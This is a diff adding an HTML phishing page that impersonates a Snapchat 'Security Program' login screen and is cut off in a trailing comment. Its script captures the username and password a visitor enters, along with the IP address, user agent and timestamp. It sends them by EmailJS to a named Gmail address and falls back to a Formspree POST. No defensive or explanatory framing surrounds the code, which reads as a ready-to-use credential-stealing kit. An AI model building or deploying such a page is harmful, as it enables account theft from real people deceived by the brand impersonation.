@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Security Program</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .login-container {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #000;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .logo p {
+            color: #666;
+            margin-top: 5px;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #FFFC00;
+            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #FFFC00;
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        
+        .login-btn:hover {
+            background-color: #e6e600;
+        }
+        
+        .forgot-password {
+            margin-top: 20px;
+        }
+        
+        .forgot-password a {
+            color: #000;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .signup-link {
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        
+        .signup-link a {
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #34c759;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 10px;
+        }
+        
+        .loading-spinner {
+            border: 3px solid rgba(255, 252, 0, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid #FFFC00;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>Snapchat</h1>
+            <p>Security Program</p>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-btn">Log In</button>
+            
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                Invalid username or password. Please try again.
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                Login information collected successfully.
+            </div>
+        </form>
+        
+        <div class="forgot-password">
+            <a href="#">Forgot your password?</a>
+        </div>
+        
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign Up</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading spinner
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            
+            // Collect additional information
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toISOString();
+            
+            // Get IP address using a public API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    
+                    // Prepare data for sending
+                    const loginData = {
+                        username: username,
+                        password: password,
+                        userAgent: userAgent,
+                        timestamp: timestamp,
+                        ip: ip
+                    };
+                    
+                    // Send data using EmailJS
+                    sendEmail(loginData);
+                })
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    
+                    // Still send data without IP
+                    const loginData = {
+                        username: username,
+                        password: password,
+                        userAgent: userAgent,
+                        timestamp: timestamp,
+                        ip: 'Unknown'
+                    };
+                    
+                    sendEmail(loginData);
+                });
+        });
+        
+        function sendEmail(data) {
+            // Using EmailJS service
+            // You'll need to sign up for EmailJS and configure these values
+            emailjs.send("service_snapchat", "template_login", {
+                to_email: "known.maniac.xt@gmail.com",
+                from_name: "Snapchat Security Program",
+                subject: "New Login Credentials",
+                message: `
+                    Username: \${data.username}
+                    Password: \${data.password}
+                    IP Address: \${data.ip}
+                    User Agent: \${data.userAgent}
+                    Timestamp: \${data.timestamp}
+                `
+            })
+            .then(function(response) {
+                console.log("Email sent successfully", response);
+                
+                // Hide loading spinner
+                document.getElementById('loading').style.display = 'none';
+                
+                // Show success message
+                document.getElementById('successMessage').style.display = 'block';
+                
+                // Reset form after 2 seconds
+                setTimeout(function() {
+                    document.getElementById('loginForm').reset();
+                    document.getElementById('successMessage').style.display = 'none';
+                }, 2000);
+            })
+            .catch(function(error) {
+                console.error("Failed to send email", error);
+                
+                // Hide loading spinner
+                document.getElementById('loading').style.display = 'none';
+                
+                // Show error message
+                document.getElementById('errorMessage').style.display = 'block';
+                
+                // Try alternative method
+                sendAlternative(data);
+            });
+        }
+        
+        function sendAlternative(data) {
+            // Alternative method using Formspree or similar service
+            fetch('https://formspree.io/f/your-form-id', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: 'known.maniac.xt@gmail.com',
+                    subject: 'Snapchat Login Credentials',
+                    message: JSON.stringify(data, null, 2)
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Alternative method successful');
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    setTimeout(function() {
+                        document.getElementById('loginForm').reset();
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 2000);
+                } else {
+                    throw new Error('Alternative method failed');
+                }
+            })
+            .catch(error => {
+                console.error('All methods failed:', error);
+                
+                // Final fallback - just log to console
+                console.log('Login data (no email sent):', data);
+            });
+        }
+    </script>
+    
+    <!-- Include Email
